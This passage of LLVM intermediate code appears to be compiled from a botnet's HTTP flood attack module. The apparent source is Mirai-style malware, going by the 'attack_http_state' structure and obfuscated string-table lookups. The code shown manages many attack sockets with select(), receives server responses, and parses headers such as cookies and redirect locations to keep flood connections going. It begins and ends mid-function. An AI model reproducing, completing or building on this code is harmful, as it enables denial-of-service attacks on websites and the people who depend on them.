  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  store i8 0, i8* %921, align 4
  %922 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %923 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %922, i32 0, i32 0
  %924 = load i32, i32* %923, align 4
  %925 = call i32 @close(i32 %924)
  %926 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %927 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %926, i32 0, i32 0
  store i32 -1, i32* %927, align 4
  br label %937

; <label>:928:                                    ; preds = %913
  %929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %929, i32 0, i32 1
  store i8 0, i8* %930, align 4
  %931 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %932 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 4
  %934 = call i32 @close(i32 %933)
  %935 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %936 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %935, i32 0, i32 0
  store i32 -1, i32* %936, align 4
  br label %937

; <label>:937:                                    ; preds = %928, %919
  br label %938

; <label>:938:                                    ; preds = %937, %912
  br label %939

; <label>:939:                                    ; preds = %938, %879
  br label %940

; <label>:940:                                    ; preds = %939, %846
  br label %941

; <label>:941:                                    ; preds = %940, %813
  br label %942

; <label>:942:                                    ; preds = %941, %533
  br label %943

; <label>:943:                                    ; preds = %942, %484
  br label %944

; <label>:944:                                    ; preds = %943, %498, %421
  %945 = load i32, i32* %9, align 4
  %946 = add nsw i32 %945, 1
  store i32 %946, i32* %9, align 4
  br label %373

; <label>:947:                                    ; preds = %373
  %948 = load i32, i32* %23, align 4
  %949 = icmp eq i32 %948, 0
  br i1 %949, label %950, label %951

; <label>:950:                                    ; preds = %947
  br label %350

; <label>:951:                                    ; preds = %947
  %952 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %952, align 8
  %953 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %953, align 8
  %954 = load i32, i32* %23, align 4
  %955 = call i32 @select(i32 %954, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %955, i32* %24, align 4
  %956 = call i64 @time(i64* null) #6
  %957 = trunc i64 %956 to i32
  store i32 %957, i32* %27, align 4
  %958 = load i32, i32* %24, align 4
  %959 = icmp slt i32 %958, 1
  br i1 %959, label %960, label %961

; <label>:960:                                    ; preds = %951
  br label %350

; <label>:961:                                    ; preds = %951
  store i32 0, i32* %9, align 4
  br label %962

; <label>:962:                                    ; preds = %2441, %961
  %963 = load i32, i32* %9, align 4
  %964 = load i32, i32* %18, align 4
  %965 = icmp slt i32 %963, %964
  br i1 %965, label %966, label %2444

; <label>:966:                                    ; preds = %962
  %967 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %968 = load i32, i32* %9, align 4
  %969 = sext i32 %968 to i64
  %970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %967, i64 %969
  store %struct.attack_http_state* %970, %struct.attack_http_state** %26, align 8
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 4
  %974 = icmp eq i32 %973, -1
  br i1 %974, label %975, label %976

; <label>:975:                                    ; preds = %966
  br label %2441

; <label>:976:                                    ; preds = %966
  %977 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %978 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %979 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %978, i32 0, i32 0
  %980 = load i32, i32* %979, align 4
  %981 = sdiv i32 %980, 64
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds [16 x i64], [16 x i64]* %977, i64 0, i64 %982
  %984 = load i64, i64* %983, align 8
  %985 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %986 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %985, i32 0, i32 0
  %987 = load i32, i32* %986, align 4
  %988 = srem i32 %987, 64
  %989 = zext i32 %988 to i64
  %990 = shl i64 1, %989
  %991 = and i64 %984, %990
  %992 = icmp ne i64 %991, 0
  br i1 %992, label %993, label %1017

; <label>:993:                                    ; preds = %976
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %994 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 4
  %997 = bitcast i32* %35 to i8*
  %998 = call i32 @getsockopt(i32 %996, i32 1, i32 4, i8* %997, i32* %36) #6
  store i32 %998, i32* %12, align 4
  %999 = load i32, i32* %35, align 4
  %1000 = icmp eq i32 %999, 0
  br i1 %1000, label %1001, label %1007

; <label>:1001:                                   ; preds = %993
  %1002 = load i32, i32* %12, align 4
  %1003 = icmp eq i32 %1002, 0
  br i1 %1003, label %1004, label %1007

; <label>:1004:                                   ; preds = %1001
  %1005 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1006 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1005, i32 0, i32 1
  store i8 4, i8* %1006, align 4
  br label %1016

; <label>:1007:                                   ; preds = %1001, %993
  %1008 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1009 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1008, i32 0, i32 0
  %1010 = load i32, i32* %1009, align 4
  %1011 = call i32 @close(i32 %1010)
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i32 0, i32 0
  store i32 -1, i32* %1013, align 4
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 1
  store i8 0, i8* %1015, align 4
  br label %2441

; <label>:1016:                                   ; preds = %1004
  br label %1017

; <label>:1017:                                   ; preds = %1016, %976
  %1018 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1019 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 4
  %1022 = sdiv i32 %1021, 64
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds [16 x i64], [16 x i64]* %1018, i64 0, i64 %1023
  %1025 = load i64, i64* %1024, align 8
  %1026 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1026, i32 0, i32 0
  %1028 = load i32, i32* %1027, align 4
  %1029 = srem i32 %1028, 64
  %1030 = zext i32 %1029 to i64
  %1031 = shl i64 1, %1030
  %1032 = and i64 %1025, %1031
  %1033 = icmp ne i64 %1032, 0
  br i1 %1033, label %1034, label %2440

; <label>:1034:                                   ; preds = %1017
  %1035 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1035, i32 0, i32 1
  %1037 = load i8, i8* %1036, align 4
  %1038 = zext i8 %1037 to i32
  %1039 = icmp eq i32 %1038, 6
  br i1 %1039, label %1040, label %2003

; <label>:1040:                                   ; preds = %1034
  store i32 0, i32* %37, align 4
  %1041 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1041, i32 10240)
  %1042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 4
  %1045 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1046 = call i64 @recv(i32 %1044, i8* %1045, i64 10240, i32 16386)
  %1047 = trunc i64 %1046 to i32
  store i32 %1047, i32* %12, align 4
  %1048 = icmp slt i32 %1047, 1
  br i1 %1048, label %1049, label %1058

; <label>:1049:                                   ; preds = %1040
  %1050 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1051 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1050, i32 0, i32 0
  %1052 = load i32, i32* %1051, align 4
  %1053 = call i32 @close(i32 %1052)
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 0
  store i32 -1, i32* %1055, align 4
  %1056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1056, i32 0, i32 1
  store i8 0, i8* %1057, align 4
  br label %2441

; <label>:1058:                                   ; preds = %1040
  %1059 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1060 = load i32, i32* %12, align 4
  %1061 = call i32 @util_memsearch(i8* %1059, i32 %1060, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1062 = icmp eq i32 %1061, -1
  br i1 %1062, label %1063, label %1067

; <label>:1063:                                   ; preds = %1058
  %1064 = load i32, i32* %12, align 4
  %1065 = icmp slt i32 %1064, 10240
  br i1 %1065, label %1066, label %1067

; <label>:1066:                                   ; preds = %1063
  br label %2441

; <label>:1067:                                   ; preds = %1063, %1058
  %1068 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1069 = load i32, i32* %12, align 4
  %1070 = call i32 @util_memsearch(i8* %1068, i32 %1069, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1071
  store i8 0, i8* %1072, align 1
  %1073 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1074 = load i32, i32* %12, align 4
  %1075 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1076 = call i32 @util_stristr(i8* %1073, i32 %1074, i8* %1075)
  %1077 = icmp ne i32 %1076, -1
  br i1 %1077, label %1078, label %1081

; <label>:1078:                                   ; preds = %1067
  %1079 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1080 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1079, i32 0, i32 11
  store i32 2, i32* %1080, align 4
  br label %1081

; <label>:1081:                                   ; preds = %1078, %1067
  %1082 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1083 = load i32, i32* %12, align 4
  %1084 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1085 = call i32 @util_stristr(i8* %1082, i32 %1083, i8* %1084)
  %1086 = icmp ne i32 %1085, -1
  br i1 %1086, label %1087, label %1090

; <label>:1087:                                   ; preds = %1081
  %1088 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1089 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1088, i32 0, i32 11
  store i32 1, i32* %1089, align 4
  br label %1090

; <label>:1090:                                   ; preds = %1087, %1081
  %1091 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1092 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1091, i32 0, i32 12
  store i32 0, i32* %1092, align 4
  %1093 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1094 = load i32, i32* %12, align 4
  %1095 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1096 = call i32 @util_stristr(i8* %1093, i32 %1094, i8* %1095)
  %1097 = icmp ne i32 %1096, -1
  br i1 %1097, label %1098, label %1149

; <label>:1098:                                   ; preds = %1090
  %1099 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1100 = load i32, i32* %12, align 4
  %1101 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1102 = call i32 @util_stristr(i8* %1099, i32 %1100, i8* %1101)
  store i32 %1102, i32* %38, align 4
  %1103 = load i32, i32* %38, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1104
  %1106 = load i8, i8* %1105, align 1
  %1107 = sext i8 %1106 to i32
  %1108 = icmp eq i32 %1107, 32
  br i1 %1108, label %1109, label %1112

; <label>:1109:                                   ; preds = %1098
  %1110 = load i32, i32* %38, align 4
  %1111 = add nsw i32 %1110, 1
  store i32 %1111, i32* %38, align 4
  br label %1112

; <label>:1112:                                   ; preds = %1109, %1098
  %1113 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1114 = load i32, i32* %38, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds i8, i8* %1113, i64 %1115
  %1117 = load i32, i32* %12, align 4
  %1118 = load i32, i32* %38, align 4
  %1119 = sub nsw i32 %1117, %1118
  %1120 = call i32 @util_memsearch(i8* %1116, i32 %1119, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1120, i32* %39, align 4
  %1121 = load i32, i32* %39, align 4
  %1122 = icmp ne i32 %1121, -1
  br i1 %1122, label %1123, label %1148

; <label>:1123:                                   ; preds = %1112
  %1124 = load i32, i32* %38, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1125
  store i8* %1126, i8** %40, align 8
  %1127 = load i32, i32* %39, align 4
  %1128 = icmp sge i32 %1127, 2
  br i1 %1128, label %1129, label %1132

; <label>:1129:                                   ; preds = %1123
  %1130 = load i32, i32* %39, align 4
  %1131 = sub nsw i32 %1130, 2
  store i32 %1131, i32* %39, align 4
  br label %1132

; <label>:1132:                                   ; preds = %1129, %1123
  %1133 = load i32, i32* %38, align 4
  %1134 = load i32, i32* %39, align 4
  %1135 = add nsw i32 %1133, %1134
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1136
  store i8 0, i8* %1137, align 1
  %1138 = load i8*, i8** %40, align 8
  %1139 = load i8*, i8** %40, align 8
  %1140 = call i32 @util_strlen(i8* %1139)
  %1141 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1142 = call i32 @util_stristr(i8* %1138, i32 %1140, i8* %1141)
  %1143 = icmp ne i32 %1142, 0
  br i1 %1143, label %1144, label %1147

; <label>:1144:                                   ; preds = %1132
  %1145 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1146 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1145, i32 0, i32 12
  store i32 1, i32* %1146, align 4
  br label %1147

; <label>:1147:                                   ; preds = %1144, %1132
  br label %1148

; <label>:1148:                                   ; preds = %1147, %1112
  br label %1149

; <label>:1149:                                   ; preds = %1148, %1090
  %1150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1150, i32 0, i32 13
  store i32 0, i32* %1151, align 4
  %1152 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1153 = load i32, i32* %12, align 4
  %1154 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1155 = call i32 @util_stristr(i8* %1152, i32 %1153, i8* %1154)
  %1156 = icmp ne i32 %1155, -1
  br i1 %1156, label %1157, label %1208

; <label>:1157:                                   ; preds = %1149
  %1158 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1159 = load i32, i32* %12, align 4
  %1160 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1161 = call i32 @util_stristr(i8* %1158, i32 %1159, i8* %1160)
  store i32 %1161, i32* %41, align 4
  %1162 = load i32, i32* %41, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1163
  %1165 = load i8, i8* %1164, align 1
  %1166 = sext i8 %1165 to i32
  %1167 = icmp eq i32 %1166, 32
  br i1 %1167, label %1168, label %1171

; <label>:1168:                                   ; preds = %1157
  %1169 = load i32, i32* %41, align 4
  %1170 = add nsw i32 %1169, 1
  store i32 %1170, i32* %41, align 4
  br label %1171

; <label>:1171:                                   ; preds = %1168, %1157
  %1172 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1173 = load i32, i32* %41, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds i8, i8* %1172, i64 %1174
  %1176 = load i32, i32* %12, align 4
  %1177 = load i32, i32* %41, align 4
  %1178 = sub nsw i32 %1176, %1177
  %1179 = call i32 @util_memsearch(i8* %1175, i32 %1178, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1179, i32* %42, align 4
  %1180 = load i32, i32* %42, align 4
  %1181 = icmp ne i32 %1180, -1
  br i1 %1181, label %1182, label %1207

; <label>:1182:                                   ; preds = %1171
  %1183 = load i32, i32* %41, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1184
  store i8* %1185, i8** %43, align 8
  %1186 = load i32, i32* %42, align 4
  %1187 = icmp sge i32 %1186, 2
  br i1 %1187, label %1188, label %1191

; <label>:1188:                                   ; preds = %1182
  %1189 = load i32, i32* %42, align 4
  %1190 = sub nsw i32 %1189, 2
  store i32 %1190, i32* %42, align 4
  br label %1191

; <label>:1191:                                   ; preds = %1188, %1182
  %1192 = load i32, i32* %41, align 4
  %1193 = load i32, i32* %42, align 4
  %1194 = add nsw i32 %1192, %1193
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1195
  store i8 0, i8* %1196, align 1
  %1197 = load i8*, i8** %43, align 8
  %1198 = load i8*, i8** %43, align 8
  %1199 = call i32 @util_strlen(i8* %1198)
  %1200 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1201 = call i32 @util_stristr(i8* %1197, i32 %1199, i8* %1200)
  %1202 = icmp ne i32 %1201, 0
  br i1 %1202, label %1203, label %1206

; <label>:1203:                                   ; preds = %1191
  %1204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1204, i32 0, i32 13
  store i32 1, i32* %1205, align 4
  br label %1206

; <label>:1206:                                   ; preds = %1203, %1191
  br label %1207

; <label>:1207:                                   ; preds = %1206, %1171
  br label %1208

; <label>:1208:                                   ; preds = %1207, %1149
  %1209 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1210 = load i32, i32* %12, align 4
  %1211 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1212 = call i32 @util_stristr(i8* %1209, i32 %1210, i8* %1211)
  %1213 = icmp ne i32 %1212, -1
  br i1 %1213, label %1214, label %1259

; <label>:1214:                                   ; preds = %1208
  %1215 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1216 = load i32, i32* %12, align 4
  %1217 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1218 = call i32 @util_stristr(i8* %1215, i32 %1216, i8* %1217)
  store i32 %1218, i32* %44, align 4
  %1219 = load i32, i32* %44, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1220
  %1222 = load i8, i8* %1221, align 1
  %1223 = sext i8 %1222 to i32
  %1224 = icmp eq i32 %1223, 32
  br i1 %1224, label %1225, label %1228

; <label>:1225:                                   ; preds = %1214
  %1226 = load i32, i32* %44, align 4
  %1227 = add nsw i32 %1226, 1
  store i32 %1227, i32* %44, align 4
  br label %1228

; <label>:1228:                                   ; preds = %1225, %1214
  %1229 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1230 = load i32, i32* %44, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds i8, i8* %1229, i64 %1231
  %1233 = load i32, i32* %12, align 4
  %1234 = load i32, i32* %44, align 4
  %1235 = sub nsw i32 %1233, %1234
  %1236 = call i32 @util_memsearch(i8* %1232, i32 %1235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1236, i32* %45, align 4
  %1237 = load i32, i32* %45, align 4
  %1238 = icmp ne i32 %1237, -1
  br i1 %1238, label %1239, label %1258

; <label>:1239:                                   ; preds = %1228
  %1240 = load i32, i32* %44, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1241
  store i8* %1242, i8** %46, align 8
  %1243 = load i32, i32* %45, align 4
  %1244 = icmp sge i32 %1243, 2
  br i1 %1244, label %1245, label %1248

; <label>:1245:                                   ; preds = %1239
  %1246 = load i32, i32* %45, align 4
  %1247 = sub nsw i32 %1246, 2
  store i32 %1247, i32* %45, align 4
  br label %1248

; <label>:1248:                                   ; preds = %1245, %1239
  %1249 = load i32, i32* %44, align 4
  %1250 = load i32, i32* %45, align 4
  %1251 = add nsw i32 %1249, %1250
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1252
  store i8 0, i8* %1253, align 1
  %1254 = load i8*, i8** %46, align 8
  %1255 = call i32 @util_atoi(i8* %1254, i32 10)
  %1256 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1257 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1256, i32 0, i32 14
  store i32 %1255, i32* %1257, align 4
  br label %1258

; <label>:1258:                                   ; preds = %1248, %1228
  br label %1262

; <label>:1259:                                   ; preds = %1208
  %1260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1260, i32 0, i32 14
  store i32 0, i32* %1261, align 4
  br label %1262

; <label>:1262:                                   ; preds = %1259, %1258
  store i32 0, i32* %37, align 4
  br label %1263

; <label>:1263:                                   ; preds = %1438, %1262
  %1264 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1265 = load i32, i32* %37, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds i8, i8* %1264, i64 %1266
  %1268 = load i32, i32* %12, align 4
  %1269 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1270 = call i32 @util_stristr(i8* %1267, i32 %1268, i8* %1269)
  %1271 = icmp ne i32 %1270, -1
  br i1 %1271, label %1272, label %1277

; <label>:1272:                                   ; preds = %1263
  %1273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1273, i32 0, i32 15
  %1275 = load i32, i32* %1274, align 4
  %1276 = icmp slt i32 %1275, 5
  br label %1277

; <label>:1277:                                   ; preds = %1272, %1263
  %1278 = phi i1 [ false, %1263 ], [ %1276, %1272 ]
  br i1 %1278, label %1279, label %1442

; <label>:1279:                                   ; preds = %1277
  %1280 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1281 = load i32, i32* %37, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds i8, i8* %1280, i64 %1282
  %1284 = load i32, i32* %12, align 4
  %1285 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1286 = call i32 @util_stristr(i8* %1283, i32 %1284, i8* %1285)
  store i32 %1286, i32* %47, align 4
  %1287 = load i32, i32* %37, align 4
  %1288 = load i32, i32* %47, align 4
  %1289 = add nsw i32 %1287, %1288
  %1290 = sext i32 %1289 to i64
  %1291 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1290
  %1292 = load i8, i8* %1291, align 1
  %1293 = sext i8 %1292 to i32
  %1294 = icmp eq i32 %1293, 32
  br i1 %1294, label %1295, label %1298

; <label>:1295:                                   ; preds = %1279
  %1296 = load i32, i32* %47, align 4
  %1297 = add nsw i32 %1296, 1
  store i32 %1297, i32* %47, align 4
  br label %1298

; <label>:1298:                                   ; preds = %1295, %1279
  %1299 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1300 = load i32, i32* %37, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds i8, i8* %1299, i64 %1301
  %1303 = load i32, i32* %47, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds i8, i8* %1302, i64 %1304
  %1306 = load i32, i32* %12, align 4
  %1307 = load i32, i32* %37, align 4
  %1308 = sub nsw i32 %1306, %1307
  %1309 = load i32, i32* %47, align 4
  %1310 = sub nsw i32 %1308, %1309
  %1311 = call i32 @util_memsearch(i8* %1305, i32 %1310, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1311, i32* %48, align 4
  %1312 = load i32, i32* %48, align 4
  %1313 = icmp ne i32 %1312, -1
  br i1 %1313, label %1314, label %1438

; <label>:1314:                                   ; preds = %1298
  %1315 = load i32, i32* %37, align 4
  %1316 = load i32, i32* %47, align 4
  %1317 = add nsw i32 %1315, %1316
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1318
  store i8* %1319, i8** %49, align 8
  %1320 = load i32, i32* %48, align 4
  %1321 = icmp sge i32 %1320, 2
  br i1 %1321, label %1322, label %1325

; <label>:1322:                                   ; preds = %1314
  %1323 = load i32, i32* %48, align 4
  %1324 = sub nsw i32 %1323, 2
  store i32 %1324, i32* %48, align 4
  br label %1325

; <label>:1325:                                   ; preds = %1322, %1314
  %1326 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1327 = load i32, i32* %37, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds i8, i8* %1326, i64 %1328
  %1330 = load i32, i32* %47, align 4
  %1331 = sext i32 %1330 to i64
  %1332 = getelementptr inbounds i8, i8* %1329, i64 %1331
  %1333 = load i32, i32* %12, align 4
  %1334 = load i32, i32* %37, align 4
  %1335 = sub nsw i32 %1333, %1334
  %1336 = load i32, i32* %47, align 4
  %1337 = sub nsw i32 %1335, %1336
  %1338 = call i32 @util_memsearch(i8* %1332, i32 %1337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1339 = icmp sgt i32 %1338, 0
  br i1 %1339, label %1340, label %1355

; <label>:1340:                                   ; preds = %1325
  %1341 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1342 = load i32, i32* %37, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds i8, i8* %1341, i64 %1343
  %1345 = load i32, i32* %47, align 4
  %1346 = sext i32 %1345 to i64
  %1347 = getelementptr inbounds i8, i8* %1344, i64 %1346
  %1348 = load i32, i32* %12, align 4
  %1349 = load i32, i32* %37, align 4
  %1350 = sub nsw i32 %1348, %1349
  %1351 = load i32, i32* %47, align 4
  %1352 = sub nsw i32 %1350, %1351
  %1353 = call i32 @util_memsearch(i8* %1347, i32 %1352, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1354 = sub nsw i32 %1353, 1
  store i32 %1354, i32* %48, align 4
  br label %1355

; <label>:1355:                                   ; preds = %1340, %1325
  %1356 = load i32, i32* %37, align 4
  %1357 = load i32, i32* %47, align 4
  %1358 = add nsw i32 %1356, %1357
  %1359 = load i32, i32* %48, align 4
  %1360 = add nsw i32 %1358, %1359
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1361
  store i8 0, i8* %1362, align 1
  store i32 0, i32* %10, align 4
  br label %1363

; <label>:1363:                                   ; preds = %1378, %1355
  %1364 = load i32, i32* %10, align 4
  %1365 = load i8*, i8** %49, align 8
  %1366 = call i32 @util_strlen(i8* %1365)
  %1367 = icmp slt i32 %1364, %1366
  br i1 %1367, label %1368, label %1381

; <label>:1368:                                   ; preds = %1363
  %1369 = load i8*, i8** %49, align 8
  %1370 = load i32, i32* %10, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds i8, i8* %1369, i64 %1371
  %1373 = load i8, i8* %1372, align 1
  %1374 = sext i8 %1373 to i32
  %1375 = icmp eq i32 %1374, 61
  br i1 %1375, label %1376, label %1377

; <label>:1376:                                   ; preds = %1368
  br label %1381

; <label>:1377:                                   ; preds = %1368
  br label %1378

; <label>:1378:                                   ; preds = %1377
  %1379 = load i32, i32* %10, align 4
  %1380 = add nsw i32 %1379, 1
  store i32 %1380, i32* %10, align 4
  br label %1363

; <label>:1381:                                   ; preds = %1376, %1363
  %1382 = load i8*, i8** %49, align 8
  %1383 = load i32, i32* %10, align 4
